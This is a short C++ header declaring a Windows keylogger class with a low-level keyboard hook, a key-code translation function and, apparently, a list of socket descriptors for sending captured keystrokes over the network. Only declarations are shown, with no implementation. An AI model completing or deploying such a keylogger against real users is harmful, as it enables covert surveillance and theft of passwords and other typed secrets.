#pragma once
#include <WinSock2.h>
#include <thread>
#include <future>
#include <windows.h>
#include <vector>

class Keylogger {
    std::thread _t;
    std::promise<void> _p;
    HHOOK _hHook;
    std::vector<int> keylogfds;

    void keylogFunc(std::future<void> future);
public:
    Keylogger();
    ~Keylogger();
};

extern std::vector<int> keylogfds;
std::pair <std::string, bool> changeToKeyPress(DWORD dwKeyCode); // get key press from DWORD
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

